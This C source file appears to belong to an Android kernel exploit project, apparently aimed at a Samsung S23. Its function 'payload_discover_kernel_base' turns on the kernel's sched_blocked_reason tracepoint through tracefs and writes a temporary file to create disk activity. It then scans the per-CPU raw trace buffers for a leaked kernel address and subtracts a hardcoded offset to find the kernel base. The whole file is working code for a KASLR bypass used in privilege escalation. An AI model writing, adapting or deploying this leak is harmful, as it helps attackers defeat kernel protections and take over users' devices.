#define _GNU_SOURCE
#include "include/payload.h"

#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define TRACE_ROOT "/sys/kernel/tracing"
#define EVENT_TYPE_SCHED_BLOCKED_REASON 0x6cU
#define SCHED_BLOCKED_CALLER_RVA 0x10db44ULL

static int write_control(const char *suffix, const char *value)
{
    char path[192];
    int fd;
    ssize_t count;
    snprintf(path, sizeof(path), "%s/%s", TRACE_ROOT, suffix);
    fd = open(path, O_WRONLY | O_CLOEXEC);
    if (fd < 0) return -1;
    count = write(fd, value, strlen(value));
    close(fd);
    return count == (ssize_t)strlen(value) ? 0 : -1;
}

static void cleanup_trace(void)
{
    (void)write_control("events/sched/sched_blocked_reason/enable", "0");
    (void)write_control("tracing_on", "0");
}

static int create_io_sample(void)
{
    char path[128];
    unsigned char *buffer = calloc(1, 0x40000);
    int fd;
    unsigned iteration;
    if (buffer == NULL) return -1;
    snprintf(path, sizeof(path), "/data/local/tmp/.s23-trace-io-%ld",
             (long)getpid());
    fd = open(path, O_CREAT | O_TRUNC | O_WRONLY | O_CLOEXEC, 0600);
    if (fd < 0) { free(buffer); return -1; }
    for (iteration = 0; iteration < 16; ++iteration) {
        size_t done = 0;
        while (done < 0x40000) {
            ssize_t count = write(fd, buffer + done, 0x40000 - done);
            if (count <= 0) { close(fd); unlink(path); free(buffer); return -1; }
            done += (size_t)count;
        }
    }
    free(buffer);
    (void)fsync(fd);
    close(fd);
    unlink(path);
    return 0;
}

static int scan_trace(const unsigned char *buffer, ssize_t size,
                      uint64_t *kernel_base)
{
    ssize_t offset;
    for (offset = 0; offset + 0x18 <= size; offset += 4) {
        uint16_t type;
        uint64_t caller;
        memcpy(&type, buffer + offset, sizeof(type));
        if (type != EVENT_TYPE_SCHED_BLOCKED_REASON) continue;
        memcpy(&caller, buffer + offset + 0x10, sizeof(caller));
        if (caller < 0xffffff8000000000ULL) continue;
        *kernel_base = caller - SCHED_BLOCKED_CALLER_RVA;
        if ((*kernel_base & 0xfffU) == 0) return 0;
    }
    return -1;
}

int payload_discover_kernel_base(const struct payload_config *config,
                                 uint64_t *kernel_base)
{
    long cpu, cpu_count = sysconf(_SC_NPROCESSORS_ONLN);
    cleanup_trace();
    if (write_control("events/sched/sched_blocked_reason/enable", "1") != 0 ||
        write_control("tracing_on", "1") != 0 || create_io_sample() != 0) {
        cleanup_trace();
        return -1;
    }
    sleep(config->tracefs_sample_sec);
    (void)write_control("tracing_on", "0");
    for (cpu = 0; cpu < (cpu_count > 0 ? cpu_count : 1); ++cpu) {
        char path[192];
        unsigned char buffer[0x1000];
        int fd;
        ssize_t count;
        snprintf(path, sizeof(path), TRACE_ROOT "/per_cpu/cpu%ld/trace_pipe_raw", cpu);
        fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
        if (fd < 0) continue;
        count = read(fd, buffer, sizeof(buffer));
        close(fd);
        if (count > 0 && scan_trace(buffer, count, kernel_base) == 0) {
            cleanup_trace();
            return 0;
        }
    }
    cleanup_trace();
    return -1;
}
